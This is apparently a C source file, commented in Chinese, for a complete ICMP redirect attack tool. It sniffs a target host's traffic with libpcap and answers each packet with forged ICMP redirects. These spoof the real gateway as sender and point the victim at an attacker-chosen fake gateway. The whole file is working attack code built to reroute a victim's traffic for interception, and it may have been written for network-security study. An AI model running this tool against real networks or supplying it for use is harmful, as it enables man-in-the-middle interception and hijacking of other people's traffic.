#include<pcap.h>
#include<stdio.h>
#include<string.h>
#include<strings.h>
#include<unistd.h>
#include<stdlib.h>
#include<netinet/ip.h>
#include<netinet/ip_icmp.h>
#include<netinet/ether.h>
#include<arpa/inet.h>
#include<sys/types.h>
#include<sys/socket.h>
#define ETHER_SIZE 14
#define ul char
void copyByByte(u_char *from,u_char *to,int length){
	
	for (int i = 0 ; i < length ; i++){
		to[i] = from[i];
		// printf("from : %d - to : %d\n", *from, *to);
	}	
}
void displayByByte(u_char *ch,int length){
	for(int i =0 ; i< length; i++){
		printf("%d ",*ch);
		ch++;
	}
	printf("\n");
}

unsigned short in_cksum(unsigned short *addr, int len) {
  int sum = 0;
  unsigned short res = 0;
  while( len > 1) {
  	sum += *addr++;
	len -= 2;
  }
  if ( len == 1) {
  	*((unsigned char *)(&res)) = *((unsigned char *)addr);
	sum += res;
  }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  res = ~sum;
  return res;
}

// 抓包分析:抓取被攻击的主机发送出来的包，并进行分析
void get_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
	static int count = 1;
	const char *payload;
	printf("-------------------------\n");
	printf("packet number: %d\n", count++);

	// ip报头分析
	printf("Protocol IP:\n");
	struct ip *ip = (struct ip*)(packet + ETHER_SIZE);
	printf("  IP header length: %d\n",ip->ip_hl<<2);
	printf("  From %s\n", inet_ntoa(ip->ip_src));
	printf("  To %s\n\n", inet_ntoa(ip->ip_dst));
	int ip_hl = ip->ip_hl<<2;

	switch(ip->ip_p){
		case IPPROTO_TCP:
			{
				printf("Protocol TCP\n");
			/*	struct tcphdr *tcp = (struct tcphdr *)(packet + 14 + ip_hl);
				int h_size = tcp->doff * 4;
				int payload_size = ntohs(ip->ip_len) - ip_hl - h_size;
				if (payload_size > 0) {
					payload = (u_char *)(tcp + 1);
					printf("payload is: \n");
					print_payload(payload_size,payload);
				}
				printf("\n");*/
				break;
			}
		case IPPROTO_UDP: printf("Protocol UDP\n");break;
		case IPPROTO_ICMP:
			{
				 printf("Protocol ICMP\n");
				 struct icmp *icmp = (struct icmp*)(packet+ ETHER_SIZE + ip_hl);
				 printf("ICMP type: %d\n",icmp->icmp_type);
				 printf("ICMP code: %d\n",icmp->icmp_code);
				 break;
			}
		case IPPROTO_IP: printf("Protocol IP\n");break;
		default: printf("Protocol unknow\n");break;
	}
	return;

}
// ICMP重定向攻击
void attackHost(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
	get_packet(args,header,packet);
	printf("-----start attack -------\n");

	struct ip *ip = (struct ip*)(packet + ETHER_SIZE);
        struct packet_struct
	{
		struct iphdr ip;
		struct icmphdr icmp;
		char datas[28];
        }sendPacket;	
	// 建立socket
	/* socket() 参数
	 * 第一个参数: AF_INET,PF_INET,AF_PACKET,PF_PACKET
	 * 	AF_* 和 PF_* 区别不大
	 * 	_INET 和 _PACKET：_INET 用户无法获取链路层数据报头，即以太网头部;而_PACKET是面向链路层的套接字，则可以
	 * 第二个参数: SOCK_RAW,SOCK_STREAM ; 
	 * 	SOCKET类型：流套接字，数据报套接字，原始套接字
	 * 第三个参数: IPPROTO_TCP,IPPROTO_UDP,IPPROTO_ICMP,IPPROTO_ROW;
	 * 	IPPROTO_TCP,IPPROTO_UDP,IPPROTO_ICMP 只能从IP首部之后的数据部分开始构造，只有IPPROTO_ROW能够构造IP首部
	 */
	
	int socketfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (socketfd < 0) {
		printf("[E] Error when create socket\n");
		return;
	}

	// 初始化scokaddr_in结构
	struct sockaddr_in socket_target;
	/* struct sockaddr_in {
	 *	short int sin_family;           // 地址族
	 *	unsigned short int sin_port;    // 端口号
	 *	struct in_addr sin_addr;	// IP 地址
	 *	unsigned char sin_zero[8];
	 * }
	 * struct in_addr {
	 *	unsigned long s_addr;           // 32位IP地址
	 * }
	 */
	socket_target.sin_family = AF_INET;  // 基于IP的Socket使用
	inet_aton(inet_ntoa(ip->ip_src), &(socket_target.sin_addr)); // IP设置 
	socket_target.sin_port = htons(0);   // 端口号设置
	bzero(&(socket_target.sin_zero), sizeof(socket_target.sin_zero)); // 补0
	
	// printf("scoketaddr_in\n");	
	// 构造发包 
	// 1.首先构造IP数据报
	int HEADERLEN = 20;
	int ipLength = HEADERLEN + 0x10 + ( ip->ip_hl * 4 ) ; // 20字节IP报头 + 8字节ICMP报头 + 原IP数据报中IP报头长度 + 64位（8字节）原IP数据报body
	ul *packetRaw = (ul *)malloc(sizeof(ul) * ipLength);
	struct ip *attackIp = (struct ip*)packetRaw;
	bzero(packetRaw,ipLength);
		
	attackIp->ip_v = 4;
	attackIp->ip_hl = 5;
	attackIp->ip_tos = 0;
	attackIp->ip_len = htons(56);
	attackIp->ip_off = 0;
	attackIp->ip_ttl = 64;
	attackIp->ip_p = IPPROTO_ICMP;

	char **gw = (char **)args;
	inet_aton(gw[0], &(attackIp->ip_src));
	inet_aton(inet_ntoa(ip->ip_src), &(attackIp->ip_dst));
 	// printf("IP\n");

	// 2.构造ICMP数据包
	/*ICMP 重定向数据结构
	 * struct icmp{
	 * 	u_int8_t icmp_type;
	 * 	u_int8_t icmp_code;
	 * 	u_int16_t icmp_cksum;
	 * 	union{
	 * 		struct in_addr ih_gwaddr;
	 * 	        ...
	 */
	struct icmp *attackIcmp = (struct icmp*)(packetRaw + HEADERLEN);
	
	attackIcmp->icmp_type = ICMP_REDIRECT;
	attackIcmp->icmp_code = 1;
	inet_aton(gw[1], &(attackIcmp->icmp_gwaddr));
	
        int icmpDataLength = 8 + ( ip->ip_hl<<2 );
	// memcpy((u_char*)(attackIcmp + 8), ip, icmpDataLength);

	copyByByte((ul*)ip, ( (ul*)attackIcmp + 8), icmpDataLength); // 拷贝原IP数据报报头加8字节内容
	displayByByte((u_char*)ip, icmpDataLength);
	displayByByte((u_char*)attackIcmp+8, icmpDataLength);
	// printf("ICMP\n");
	// 发包，发送number个
	int number = 5;
	for (int i = 0; i < number; i++) {
		// 修改IP和ICMP的校验和
		// 先设置IP和ICMP的校验和为0，再进行校验和的计算
		attackIp->ip_id = i;
		attackIp->ip_sum = 0;
		attackIcmp->icmp_cksum = 0;
		
		attackIp->ip_sum = in_cksum((unsigned short*)attackIp, 20);
		attackIcmp->icmp_cksum = in_cksum((unsigned short*)attackIcmp, icmpDataLength + 8);
		
		// 发包
		sendto(socketfd, packetRaw, ipLength, 0, (struct sockaddr *)(&socket_target), sizeof(socket_target));
	}
	printf("\n");
	free(packetRaw);
	close(socketfd);	
}

int main(int argc, char *argv[])
 {
	pcap_t *handle;			/* Session handle */
	char *dev;			/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[100];	        /* The filter expression */
	bpf_u_int32 mask;		/* Our netmask */
	bpf_u_int32 net;		/* Our IP */
	struct pcap_pkthdr header;	/* The header that pcap gives us */
	const u_char *packet;		/* The actual packet */
        char *gateways[2];               /* 传入attack函数的参数，分别为Gateway,FakeGateway */

	if (argc != 5) {
		printf("Usage %s Interface TargetIP GateWay FakeGatWay\n", argv[0]);
		return 0;
	}

	printf("-------start--------\n");
	
	// 设置参数
	dev = argv[1];
	printf("[I] device: %s\n", dev);

	sprintf(filter_exp, "src net %s", argv[2]);
	printf("[I] Filter Expression: %s\n", filter_exp);

        gateways[0] = argv[3];
	gateways[1] = argv[4];
	printf("[I] primary GateWay is %s\n[I] Fake Gateway is %s\n", gateways[0], gateways[1]);
	
	// 查找网络，设置net 和 mask
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		printf("[E] Couldn't get netmask for device %s: %s\n", dev, errbuf);
		return -2;
	}
	printf("[I] net = %d,mask = %d\n",net,mask);
	
	// 打开设备准备监听
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		printf("[E] Couldn't open device %s: %s\n", dev, errbuf);
		return -3;
	}

	// 解析过滤规则
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		printf("[E] Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return -4;
	}

	// 设置过滤器
	if (pcap_setfilter(handle, &fp) == -1) {
		printf("[E] Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return -5;
	}

	// pcap_loop(handle, 20, get_packet, (u_char*)gateways);
	pcap_loop(handle, -1, attackHost, (u_char*)gateways);
	// packet = pcap_next(handle, &header);
 
	/* And close the session */
	pcap_freecode(&fp);
	pcap_close(handle);
	return(0);
 }
